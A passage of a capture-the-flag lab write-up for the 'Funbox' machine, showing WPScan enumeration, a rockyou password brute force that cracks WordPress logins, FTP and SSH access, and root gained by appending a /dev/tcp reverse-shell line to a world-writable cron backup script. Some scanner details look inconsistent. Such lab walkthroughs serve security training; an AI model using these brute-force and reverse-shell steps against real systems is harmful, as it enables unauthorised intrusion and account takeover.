 |     UUID: c16c950c-1a46-4068-8ce9-6e50f9e703b5
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/c16c950c-1a46-4068-8ce9-6e50f9e703b5
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Contributor+ Arbitrary Post Modification
 |     UUID: e32e8e71-7618-42a7-8a1c-b00750e8581b
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/e32e8e71-7618-42a7-8a1c-b00750e8581b
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Contributor+ Unpublished Post Title Disclosure
 |     UUID: 3da4bdfe-948b-41b6-88fd-7cac9f3b7f73
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/3da4bdfe-948b-41b6-88fd-7cac9f3b7f73
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.1 - Author+ Unauthorized Note Reparenting via REST API
 |     UUID: bde07f91-aeb2-4875-88f2-4b18e42e331e
 |     Fixed in: 5.4.22
 |     References:
 |      - https://wpscan.com/vulnerability/bde07f91-aeb2-4875-88f2-4b18e42e331e
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-1-maintenance-and-security-release/
 |
 | [!] Title: WP < 7.1.2 - Unauthenticated LFI via Page Template Resolution
 |     UUID: 507ae4f0-6fb3-4efa-87fc-5b9b1df912c7
 |     Fixed in: 5.4.23
 |     References:
 |      - https://wpscan.com/vulnerability/507ae4f0-6fb3-4efa-87fc-5b9b1df912c7
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-87902
 |      - https://wordpress.org/news/2026/09/wordpress-7-1-2-release/

[+] WordPress theme in use: twentyseventeen
 | Location: http://funbox.fritz.box/wp-content/themes/twentyseventeen/
 | Last Updated: 2026-08-19 4:00am GMT (1 month ago, per WordPress.org)
 | Active Installs: 300,000 (per WordPress.org)
 | Readme: http://funbox.fritz.box/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 4.1
 | Style URL: http://funbox.fritz.box/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://funbox.fritz.box/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Enumerating Vulnerable Plugins (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:03:06 <=========================================================================================> (7343 / 7343) 100.00% Time: 00:03:06
[i] No plugins Found.
[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:14 <===========================================================================================> (652 / 652) 100.00% Time: 00:00:14
[i] No themes Found.
[+] Enumerating Timthumbs
 Checking Known Locations - Time: 00:01:01 <=========================================================================================> (2575 / 2575) 100.00% Time: 00:01:01

[i] No Timthumbs Found.

[+] Enumerating Config Backups
 Checking Config Backups - Time: 00:00:04 <============================================================================================> (137 / 137) 100.00% Time: 00:00:04

[i] No Config Backups Found.

[+] Enumerating DB Exports
 Checking DB Exports - Time: 00:00:02 <==================================================================================================> (84 / 84) 100.00% Time: 00:00:02

[i] No DB Exports Found.

[+] Enumerating Backup Folders
 Checking Backup Folders - Time: 00:00:00 <================================================================================================> (6 / 6) 100.00% Time: 00:00:00
[i] No Backup Folders Found.
[+] Enumerating Medias (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:02 <=======================================================================================> (100 / 100) 100.00% Time: 00:00:02

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)

[+] joe
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 Brute Forcing Author IDs - Time: 00:00:00 <=============================================================================================> (10 / 10) 100.00% Time: 00:00:00
[i] 2 user(s) Identified.
[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22
[+] Finished: Wed Sep 23 04:57:15 2026
[+] Requests Done: 10974
[+] Cached Requests: 11
[+] Most response codes received: 404: 10909, 200: 48, 301: 12, 500: 3, 302: 1
[+] Data Sent: 3.018 MB
[+] Data Received: 18.115 MB
[+] Memory used: 333.512 MB
[+] Elapsed time: 00:05:51

```

### WpSCAN Bruteforce

```bash
┌──(kali㉿kali)-[~]
└─$ sudo wpscan --url http://funbox.fritz.box/  --usernames users.txt --passwords /usr/share/wordlists/rockyou.txt
[sudo] password for kali: 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

                  WordPress Security Scanner
                         Version 4.1.0
                    An Automattic endeavor
                    https://automattic.com
_______________________________________________________________

[+] URL: http://funbox.fritz.box/ [192.168.246.77]
[+] Started: Wed Sep 23 05:05:53 2026
[+] Command Line: wpscan --url http://funbox.fritz.box/ --usernames users.txt --passwords /usr/share/wordlists/rockyou.txt
[+] Hostname: kali

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://funbox.fritz.box/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://funbox.fritz.box/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://funbox.fritz.box/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://funbox.fritz.box/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://funbox.fritz.box/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://funbox.fritz.box/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 | Confirmed By: Rss Generator (Passive Detection)
 |  - http://funbox.fritz.box/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://funbox.fritz.box/wp-content/themes/twentyseventeen/
 | Last Updated: 2026-08-19 4:00am GMT (1 month ago, per WordPress.org)
 | Active Installs: 300,000 (per WordPress.org)
 | Readme: http://funbox.fritz.box/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 4.1
 | Style URL: http://funbox.fritz.box/wp-content/themes/twentyseventeen/style.css?ver=20190507
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://funbox.fritz.box/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'

[+] Performing password attack on Wp Login against 3 user/s
[SUCCESS] - joe / 12345                                                                                                                                                    
[SUCCESS] - admin / iubire
```

### User Flag

The crakced credentials of the wordpress were tried on ftp and we got the user flag both the users. (admin | joe)

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.246.77
Connected to 192.168.246.77.
220 ProFTPD Server (Debian) [192.168.246.77]
Name (192.168.246.77:kali): joe
331 Password required for joe
Password: 
230 User joe logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||46140|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root           33 Sep 23 08:46 local.txt
-rw-------   1 joe      joe           998 Jul 18  2020 mbox
226 Transfer complete
ftp> mget *
mget mbox [anpqy?]? 
229 Entering Extended Passive Mode (|||39222|)
150 Opening BINARY mode data connection for mbox (998 bytes)
   998        8.57 MiB/s 
226 Transfer complete
998 bytes received in 00:00 (5.35 KiB/s)
mget local.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||47917|)
150 Opening BINARY mode data connection for local.txt (33 bytes)
    33      144.51 KiB/s 
226 Transfer complete
33 bytes received in 00:00 (0.24 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ ls         
CVEs       Downloads   go             mbox   passwords.list         Pictures        Public        sql1.txt  Templates  users.list
Desktop    exploit.py  hydra.restore  Music  php.php                prod.dtsConfig  reports.json  sqltest   test       users.txt
Documents  flag.txt    local.txt      nmap   php-reverse-shell.php  Projects        Result        sql.txt   Tools      Videos
                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ cat local.txt     
f25650b4a00dc22efbd0c0969c2442ae

```

### Shell

![[attachments/Offsec PG Play/Funbox/image 1.png]]

![[attachments/Offsec PG Play/Funbox/image 2.png]]

![[attachments/Offsec PG Play/Funbox/image 3.png]]

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8443                                                
listening on [any] 8443 ...
connect to [192.168.45.163] from (UNKNOWN) [192.168.246.77] 34104
sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@funbox:/var/www/html/wp-content/themes/twentynineteen$ ^Z
zsh: suspended  nc -lvnp 8443
                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg                      
[1]  + continued  nc -lvnp 8443

<ml/wp-content/themes/twentynineteen$ export TERM=xterm                      
www-data@funbox:/var/www/html/wp-content/themes/twentynineteen$ 

```

```bash
┌──(kali㉿kali)-[~]
└─$ ssh joe@192.168.246.77
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
joe@192.168.246.77's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 23 Sep 2026 09:54:53 AM UTC

  System load:  0.53              Processes:               177
  Usage of /:   57.0% of 9.78GB   Users logged in:         0
  Memory usage: 65%               IPv4 address for ens160: 192.168.246.77
  Swap usage:   1%

32 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Sep 23 09:54:38 2026 from 192.168.45.163
joe@funbox:~$ 

```

### Root Flag

### Enumeration

```text
joe@funbox:/home$ cd funny/
joe@funbox:/home/funny$ ls -la
total 47592
drwxr-xr-x 3 funny funny     4096 Aug 21  2020 .
drwxr-xr-x 4 root  root      4096 Jun 19  2020 ..
-rwxrwxrwx 1 funny funny       55 Aug 21  2020 .backup.sh
lrwxrwxrwx 1 funny funny        9 Aug 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 funny funny      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 funny funny     3771 Feb 25  2020 .bashrc
drwx------ 2 funny funny     4096 Jun 19  2020 .cache
-rw-rw-r-- 1 funny funny 48701440 Sep 23 09:58 html.tar
-rw-r--r-- 1 funny funny      807 Feb 25  2020 .profile
-rw-rw-r-- 1 funny funny      162 Jun 19  2020 .reminder.sh
joe@funbox:/home/funny$ cat .reminder.sh 
#!/bin/bash
echo "Hi Joe, the hidden backup.sh backups the entire webspace on and on. Ted, the new admin, test it in a long run." | mail -s"Reminder" joe@funbox

joe@funbox:~$ cd /home/funny/
joe@funbox:/home/funny$ cat .backup.sh 
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html

```

/code

edited the .backup.sh in the funny home folder

```text
joe@funbox:/home/funny$ ls
html.tar
joe@funbox:/home/funny$ ls -la
total 47592
drwxr-xr-x 3 funny funny     4096 Aug 21  2020 .
drwxr-xr-x 4 root  root      4096 Jun 19  2020 ..
-rwxrwxrwx 1 funny funny       55 Aug 21  2020 .backup.sh
lrwxrwxrwx 1 funny funny        9 Aug 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 funny funny      220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 funny funny     3771 Feb 25  2020 .bashrc
drwx------ 2 funny funny     4096 Jun 19  2020 .cache
-rw-rw-r-- 1 funny funny 48701440 Sep 24 04:34 html.tar
-rw-r--r-- 1 funny funny      807 Feb 25  2020 .profile
-rw-rw-r-- 1 funny funny      162 Jun 19  2020 .reminder.sh
```

```text
joe@funbox:/home/funny$ cat .backup.sh 
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html
```

```text
#!/bin/bash
tar -cf /home/funny/html.tar /var/www/html
sh -i >& /dev/tcp/192.168.45.163/8443 0>&1
```

after tyring 2 3 times i got the root shell after getting mutltiple times funny user shell

```bash
                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 8443                             
listening on [any] 8443 ...
connect to [192.168.45.163] from (UNKNOWN) [192.168.101.77] 43984
sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# cat root.txt  
cat: root.txt: No such file or directory
# ls
flag.txt
mbox
proof.txt
snap
# cat proof.txt
6a32acab06ca0cc667352d7d0f68d1ca
# 

```
